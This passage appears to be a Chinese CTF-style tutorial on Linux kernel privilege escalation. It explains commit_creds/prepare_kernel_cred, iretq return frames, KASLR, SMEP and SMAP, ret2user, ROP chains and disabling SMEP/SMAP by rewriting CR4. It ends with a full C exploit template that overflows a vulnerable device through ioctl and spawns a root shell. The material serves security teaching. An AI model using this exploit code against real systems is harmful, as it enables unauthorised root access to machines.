## 二、提权基础

### 2.1 内核提权的一般思路

内核提权的核心流程如下：

```
┌─────────────────────────────────────────────────────────────┐
│  1. 寻找 kernel 中内核程序的漏洞                              │
│         ↓                                                   │
│  2. 调用该程序进入内核态                                      │
│         ↓                                                   │
│  3. 利用漏洞进行提权（修改进程凭证为 root）                    │
│         ↓                                                   │
│  4. 提权完成后，返回用户态                                    │
└─────────────────────────────────────────────────────────────┘
```

**核心目标**：通过内核漏洞将当前进程的 UID/GID 修改为 0（root），从而获得系统的完全控制权。

### 2.2 返回用户态时的栈布局

从内核态返回用户态时，需要使用 `iretq` 指令。`iretq` 会从栈上依次弹出以下寄存器值来恢复用户态的执行上下文：

```
低地址 (low mem)
┌──────────────────┐
│       RIP        │  ← 用户态代码的指令指针（返回后执行的位置）
├──────────────────┤
│       CS         │  ← 代码段选择子（用户态）
├──────────────────┤
│     EFLAGS       │  ← 标志寄存器
├──────────────────┤
│       RSP        │  ← 用户态栈指针
──────────────────┤
│       SS         │  ← 数据段选择子（用户态）
└──────────────────┘
高地址 (high mem)
```

**关键要点**：
- 在构造 payload 时，必须按照 **RIP → CS → EFLAGS → RSP → SS** 的顺序将值压入栈中
- `iretq` 指令会自动从栈上弹出这 5 个值，完成从内核态到用户态的切换
- 通常在用户态程序中先保存这些寄存器的值，提权后再用它们构造返回栈帧

保存用户态寄存器值的常用方法：

```c
// 在用户态程序中保存寄存器上下文
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
}
```

### 2.3 关键函数：commit_creds 与 prepare_kernel_cred

Linux 内核提权的核心是调用以下两个函数的组合：

```c
commit_creds(prepare_kernel_cred(0));
```

**函数说明**：

| 函数 | 作用 |
|------|------|
| `prepare_kernel_cred(0)` | 创建一个新的 credential 结构体，参数为 0 表示创建 root 凭证（UID=0, GID=0） |
| `commit_creds()` | 将新的 credential 应用到当前进程，使当前进程获得 root 权限 |

**执行效果**：调用后，当前进程的 UID、GID、EUID、EGID 等全部变为 0，即获得 root 权限。

### 2.4 查看内核符号地址

在未开启 `kptr_restrict` 的情况下，可以通过 `/proc/kallsyms` 查看内核符号的地址：

```bash
cat /proc/kallsyms | grep symbol
```

**示例**：

```bash
# 查看 prepare_kernel_cred 的地址
cat /proc/kallsyms | grep prepare_kernel_cred

# 查看 commit_creds 的地址
cat /proc/kallsyms | grep commit_creds
```

**输出示例**：
```
ffffffff810c91d0 T prepare_kernel_cred
ffffffff810c8d40 T commit_creds
```

> **注意**：如果开启了 `kptr_restrict`，`/proc/kallsyms` 中的地址将显示为全 0，此时需要通过其他方式（如信息泄露漏洞）获取内核基址。

## 三、内核保护机制

### 3.1 KASLR（内核地址空间布局随机化）

**全称**：Kernel Address Space Layout Randomization

**作用**：每次启动时随机化内核代码和数据的加载基址，使攻击者无法预先知道内核函数的地址。

**调试时的处理**：

在 `startvm.sh` 启动脚本中，本地调试时通常将 `kaslr` 改为 `nokaslr` 以关闭地址随机化：

```bash
# 关闭 KASLR（便于本地调试）
nokaslr
```

**绕过方法**：
- 通过信息泄露漏洞获取内核基址
- 利用 `/proc/kallsyms`（未开启 kptr_restrict 时）
- 利用内核数据结构之间的相对偏移（偏移固定，不受 KASLR 影响）

### 3.2 SMEP（超级管理员模式执行保护）

**全称**：Supervisor Mode Execution Prevention

**作用**：当 CPU 处于内核态（Ring 0）时，**禁止执行用户态（Ring 3）内存中的代码**。

**检查方法**：

```bash
# 通过 root.sh 启动后查看
cat /proc/cpuinfo | grep smep
```

如果输出中包含 `smep`，则表示该保护已开启。

**影响**：
- 开启 SMEP 后，ret2user 技术中直接在内核态执行用户态的 `get()` 函数将失败
- 需要采用 ROP 或 bypass SMEP 的方法来绕过

### 3.3 SMAP（超级管理员模式访问保护）

**全称**：Supervisor Mode Access Prevention

**作用**：当 CPU 处于内核态（Ring 0）时，**禁止访问用户态（Ring 3）内存中的数据**。

**检查方法**：

```bash
# 通过 root.sh 启动后查看
cat /proc/cpuinfo | grep smap
```

如果输出中包含 `smap`，则表示该保护已开启。

**影响**：
- 开启 SMAP 后，内核态代码无法直接读写用户态栈上的数据（包括伪造的栈帧）
- 需要先将数据拷贝到内核空间，或使用其他绕过手段

**SMEP 与 SMAP 的对比**：

| 特性 | SMEP | SMAP |
|------|------|------|
| 保护对象 | 代码执行 | 数据访问 |
| 限制内容 | 内核态不能执行用户态代码 | 内核态不能访问用户态数据 |
| 控制寄存器 | CR4 第 20 位 | CR4 第 21 位 |
| 绕过方式 | ROP / 修改 CR4 | ROP / 修改 CR4 / copy_to_user 等 |

## 四、ret2user 技术

### 4.1 原理

ret2user（Return to User）是一种在**没有开启任何内核保护**（无 KASLR、无 SMEP、无 SMAP）的情况下的经典内核提权技术。

**核心思路**：
1. 利用内核漏洞（如栈溢出）控制内核态的 RIP
2. 将 RIP 指向用户态内存中的提权函数（如 `get()`）
3. 在 `get()` 函数中调用 `commit_creds(prepare_kernel_cred(0))` 完成提权
4. 通过 `iretq` 返回用户态，此时已获得 root 权限
5. 在用户态执行 `system("/bin/sh")` 获取 root shell

### 4.2 获取函数地址

首先需要确定 `prepare_kernel_cred` 和 `commit_creds` 两个函数在内核中的地址：

```bash
cat /proc/kallsyms | grep prepare_kernel_cred
cat /proc/kallsyms | grep commit_creds
```

假设得到：
- `prepare_kernel_cred` → `0xffffffff810c91d0`
- `commit_creds` → `0xffffffff810c8d40`

### 4.3 函数指针定义

在用户态的 exploit 程序中，通过函数指针调用内核函数：

```c
#define KERNCALL __attribute__((regparm(3)))

void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810c91d0;
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810c8d40;
```

**说明**：
- `__attribute__((regparm(3)))`：指定函数调用约定，前 3 个参数通过寄存器传递（rdi, rsi, rdx），这与 Linux x86_64 内核的调用约定一致
- 函数指针的类型和地址需要根据实际内核版本和 `/proc/kallsyms` 的输出来确定

### 4.4 get() 函数实现

`get()` 函数是用户态中定义的提权函数，其核心功能是完成提权并返回用户态：

```c
void get() {
    // 第一步：提权
    commit_creds(prepare_kernel_cred(0));

    // 第二步：通过 iretq 返回用户态
    asm(
        "swapgs\n"
        "pushq user_ss\n"
        "pushq user_sp\n"
        "pushq user_rflags\n"
        "pushq user_cs\n"
        "push $shell\n"
        "iretq\n"
    );
}
```

**逐行解析**：

| 指令 | 作用 |
|------|------|
| `swapgs` | 切换 GS 基址寄存器（内核态和用户态使用不同的 GS 基址，返回用户态前必须切换回来） |
| `pushq user_ss` | 将用户态 SS 压栈（iretq 第 5 个弹出的值） |
| `pushq user_sp` | 将用户态 RSP 压栈（iretq 第 4 个弹出的值） |
| `pushq user_rflags` | 将用户态 EFLAGS 压栈（iretq 第 3 个弹出的值） |
| `pushq user_cs` | 将用户态 CS 压栈（iretq 第 2 个弹出的值） |
| `push $shell` | 将 shell 函数地址作为 RIP 压栈（iretq 第 1 个弹出的值） |
| `iretq` | 中断返回指令，从栈上弹出 SS:RSP、CS:RIP、EFLAGS，完成内核态到用户态的切换 |

**注意栈的压入顺序**：从低地址到高地址依次为 `shell → user_cs → user_rflags → user_sp → user_ss`，这与 `iretq` 的弹出顺序相反。

`shell` 函数的定义：

```c
void shell() {
    if (getuid() == 0) {
        printf("[+] root privileges obtained!\n");
        system("/bin/sh");
    } else {
        printf("[-] privilege escalation failed!\n");
    }
}
```

### 4.5 利用流程

```
┌──────────────────────────────────────────────────────────────────┐
│  用户态程序启动                                                    │
│       ↓                                                          │
│  1. save_status() 保存用户态寄存器值 (CS, SS, RSP, EFLAGS)        │
│       ↓                                                          │
│  2. 打开内核设备 / 触发内核漏洞入口                                 │
│       ↓                                                          │
│  3. 构造 payload：填充数据 + get() 函数地址（覆盖返回地址）         │
│       ↓                                                          │
│  4. 触发漏洞（如 ioctl / write / read 等系统调用）                 │
│       ↓                                                          │
│  5. 内核执行流被劫持 → 跳转到用户态的 get() 函数                    │
│       ↓                                                          │
│  6. get() 中调用 commit_creds(prepare_kernel_cred(0)) 完成提权    │
│       ↓                                                          │
│  7. iretq 返回用户态 → 执行 shell() 函数                           │
│       ↓                                                          │
│  8. 获得 root shell 🎉                                            │
└──────────────────────────────────────────────────────────────────┘
```

**Payload 构造示例**（以栈溢出为例）：

```c
char payload[0x100];
memset(payload, 'A', sizeof(payload));

// 假设偏移量为 0x88，覆盖返回地址
*(unsigned long long *)(payload + 0x88) = (unsigned long long)get;

// 触发漏洞
ioctl(fd, COMMAND, payload);
```

## 五、Bypass SMEP

### 5.1 保护机制回顾

当开启 SMEP 和 SMAP 保护时：

| 保护 | 限制 |
|------|------|
| **SMEP** | 内核态中**不能执行**用户态的代码 |
| **SMAP** | 内核态中**不能访问**用户态的数据 |

这意味着 ret2user 中直接跳转到用户态 `get()` 函数的方法将失效。

### 5.2 方法一：ROP

**思路**：既然不允许执行用户态的代码，那就直接使用内核态的代码进行 ROP（Return-Oriented Programming）。

**步骤**：

1. **获取内核基址**：通过信息泄露或 `/proc/kallsyms` 获取
2. **寻找 gadget**：在内核二进制（vmlinux）中寻找可用的 ROP gadget
3. **构造 ROP 链**：
   - 调用 `prepare_kernel_cred(0)` → 结果存入 rax
   - 调用 `commit_creds(rax)` → 完成提权
   - 调用 `swapgs; iretq` 相关的 gadget 返回用户态

**ROP 链示例**：

```
pop rdi; ret          → 0          (prepare_kernel_cred 的参数)
prepare_kernel_cred   → 调用函数
pop rdi; ret          → rax 的值   (commit_creds 的参数)
commit_creds          → 调用函数
swapgs_pop_iretq_gadget            → 返回用户态
user_ss
user_sp
user_rflags
user_cs
shell_address
```

> **注意**：实际 ROP 链的构造需要根据具体内核版本的 gadget 来调整，不同内核版本的 gadget 地址不同。

### 5.3 方法二：Bypass SMEP（修改 CR4 寄存器）

**原理**：

系统根据 **CR4 寄存器**的值来判断是否开启 SMEP 保护：

- CR4 寄存器的**第 20 位**控制 SMEP：
  - **位 = 1**：SMEP 保护**开启**
  - **位 = 0**：SMEP 保护**关闭**

- CR4 寄存器的**第 21 位**控制 SMAP：
  - **位 = 1**：SMAP 保护**开启**
  - **位 = 0**：SMAP 保护**关闭**

**CR4 寄存器可以通过 `mov` 指令修改**，一般将 CR4 修改为 `0x6f0` 即可同时关闭 SMEP 和 SMAP。

**CR4 寄存器标志位对照**：

```
CR4 = 0x6f0 时：
[ OSXMMEXCPT  OSFXSR  PGE  MCE  PAE  PSE ]
  位10=1      位9=1   位7=1  位6=1  位5=1  位4=1

此时：
  位20 (SMEP) = 0 → 关闭
  位21 (SMAP) = 0 → 关闭
```

**绕过流程**：

```
┌──────────────────────────────────────────────────────────────┐
│  1. 利用内核漏洞控制执行流                                      │
│         ↓                                                    │
│  2. 通过 ROP gadget 修改 CR4 寄存器为 0x6f0                    │
│     （关闭 SMEP 和 SMAP）                                      │
│         ↓                                                    │
│  3. 此时内核态可以执行用户态代码、访问用户态数据                  │
│         ↓                                                    │
│  4. 跳转到用户态的 get() 函数                                   │
│         ↓                                                    │
│  5. get() 中完成提权 + iretq 返回用户态                         │
│         ↓                                                    │
│  6. 获得 root shell                                            │
└──────────────────────────────────────────────────────────────┘
```

**修改 CR4 的 ROP gadget 示例**：

```asm
; 寻找类似如下的 gadget
mov cr4, rdi    ; 或 mov cr4, rax
ret
```

然后在 ROP 链中：

```
pop rdi; ret
0x6f0            ; 新的 CR4 值（关闭 SMEP + SMAP）
mov_cr4_rdi_ret  ; 执行 mov cr4, rdi; ret
get              ; 跳转到用户态 get() 函数
```

## 六、实战总结

### 6.1 不同保护组合下的攻击策略

| 保护组合 | 攻击策略 |
|----------|----------|
| 无保护 | ret2user：直接跳转到用户态 get() 函数 |
| 仅 KASLR | 先泄露内核基址，再使用 ret2user |
| KASLR + SMEP | ROP 提权 或 修改 CR4 关闭 SMEP 后 ret2user |
| KASLR + SMEP + SMAP | ROP 提权 或 修改 CR4 关闭两者后 ret2user |

### 6.2 关键命令速查

```bash
# 查看内核符号地址（未开启 kptr_restrict 时）

# 查看 CPU 保护特性

# 本地调试时关闭 KASLR
# 在 startvm.sh 中添加 nokaslr

# 提权后验证
id          # 应显示 uid=0(root)
cat /flag   # 读取 flag
```

### 6.3  exploit 模板（无保护 / ret2user）

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

#define KERNCALL __attribute__((regparm(3)))

// 根据 /proc/kallsyms 的实际输出修改地址
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810c91d0;
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810c8d40;

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("[*] status has been saved.");
}

void shell() {
    if (getuid() == 0) {
        printf("[+] root privileges obtained!\n");
        system("/bin/sh");
    } else {
        printf("[-] privilege escalation failed!\n");
    }
}

void get() {
    commit_creds(prepare_kernel_cred(0));
    asm(
        "swapgs\n"
        "pushq user_ss\n"
        "pushq user_sp\n"
        "pushq user_rflags\n"
        "pushq user_cs\n"
        "push $shell\n"
        "iretq\n"
    );
}

int main() {
    save_status();

    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        puts("[-] open device failed!");
        return -1;
    }

    char payload[0x100];
    memset(payload, 'A', sizeof(payload));
    // 根据实际偏移修改
    *(unsigned long long *)(payload + 0x88) = (unsigned long long)get;

    ioctl(fd, 0x6677889B, payload);

    return 0;
}
```
